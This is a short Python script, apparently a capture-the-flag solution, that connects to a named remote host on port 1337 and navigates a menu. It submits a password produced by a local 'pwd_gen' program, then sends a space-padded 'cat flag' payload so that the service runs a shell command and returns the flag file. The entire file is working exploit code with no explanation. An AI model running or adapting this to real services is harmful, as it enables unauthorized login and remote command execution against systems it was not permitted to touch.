import socket
import os
import time

host = 'ec2-18-222-89-163.us-east-2.compute.amazonaws.com'
port = 1337

def crack():
    cmd = 'cat flag' + ' '*25 + 'cat flag' + ' '*25
    print("|" + cmd + '|')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)
    print(data)

    s.send('3\n')
    data = s.recv(1024)
    print(data)

    os.system('./pwd_gen > pwd.txt')
    f = open('pwd.txt', 'r')
    pw = f.read().strip()

    print('password: ' + pw)

    s.send(pw+ '\n')

    data = s.recv(1024)
    print(data)
    s.send('4\n')

    data = s.recv(1024)
    print(data)

    s.send(cmd + '\n')

    time.sleep(1);

    data = s.recv(1024)
    print(data)

if __name__ == '__main__':
    crack()
